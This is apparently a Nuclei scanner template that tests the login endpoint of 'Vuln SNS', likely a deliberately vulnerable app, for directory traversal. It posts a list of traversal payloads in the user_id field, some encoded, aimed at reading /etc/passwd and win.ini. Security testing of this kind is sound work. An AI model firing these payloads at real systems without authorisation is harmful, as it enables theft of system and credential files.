id: vuln-sns-login-directory-traversal
info:
  name: Vuln SNS Login - Directory Traversal
  author: claude
  severity: high
  description: |
    Tests for directory traversal vulnerabilities in login parameters.
    Successful exploitation could lead to unauthorized file access or
    information disclosure.
  reference:
    - https://owasp.org/www-community/attacks/Path_Traversal
  tags: vuln-sns,lfi,traversal,login

http:
  - method: POST
    path:
      - "{{BaseURL}}/api/login"

    headers:
      Content-Type: application/json

    body: |
      {"user_id":"{{payload}}","password":"test"}

    payloads:
      payload:
        - "../../../etc/passwd"
        - "..\\..\\..\\windows\\win.ini"
        - "....//....//....//etc/passwd"
        - "..%2F..%2F..%2Fetc%2Fpasswd"
        - "..%252f..%252f..%252fetc%252fpasswd"
        - "/etc/passwd"
        - "C:\\Windows\\win.ini"
        - "../../../../../../etc/passwd"
        - "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
        - "\\..\\..\\..\\..\\..\\..\\etc\\passwd"
        - "file:///etc/passwd"

    stop-at-first-match: true
    matchers-condition: or
    matchers:
      - type: word
        words:
          - "root:x:0:0"
          - "[fonts]"
          - "[extensions]"
          - "/bin/bash"
          - "/bin/sh"
        condition: or
        part: body

      - type: word
        words:
          - "cannot find"
          - "no such file"
          - "file not found"
          - "path not found"
        condition: or
        part: body

      - type: regex
        regex:
          - '(\/[a-zA-Z0-9]+)+:[0-9]+:[0-9]+'
          - '[a-zA-Z]:\\[a-zA-Z0-9\\.\\]+'
        condition: or
        part: body

    extractors:
      - type: regex
        name: file_content
        regex:
          - '.*'
        part: body